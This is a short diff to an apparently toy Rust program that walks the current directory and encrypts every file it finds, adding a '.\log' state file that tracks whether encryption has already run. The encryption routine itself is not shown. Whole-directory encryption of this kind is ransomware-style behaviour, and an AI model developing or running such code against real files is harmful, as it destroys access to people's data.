@@ -6,7 +6,15 @@ use hex;
 fn main() -> std::io::Result<()> {
     let mut files: Vec<PathBuf> = Vec::new();
     all_files(&mut files, &PathBuf::from(".\\"));
-    encrypt_all(files)?;
+    let key = String::from_utf8(fs::read(".\\log")?).unwrap();
+    let parts: Vec<&str> = key.split(",").collect();
+    if parts[0] == "0" {
+        encrypt_all(files)?;
+        fs::write(".\\log", format!("{},{}", "1", "123arqwreqw1234"))?;
+    } else {
+        println!("Files have already been encrypted!");
+        fs::write(".\\log", format!("{},{}", "0", ""))?;
+    }
     let _ = fs::read("foo.txt")?;
     Ok(())
 }
@@ -35,6 +43,7 @@ fn should_include(file: &str) -> bool {
         ".\\.gitignore",
         ".\\Cargo.lock",
         ".\\Cargo.toml",
+        ".\\log"
     ];
     !to_exclude.contains(&file)
 }
@@ -55,4 +64,3 @@ fn to_sha3(content: &str) -> String {
     let data = hasher.finalize();
     hex::encode(data)
 }
-
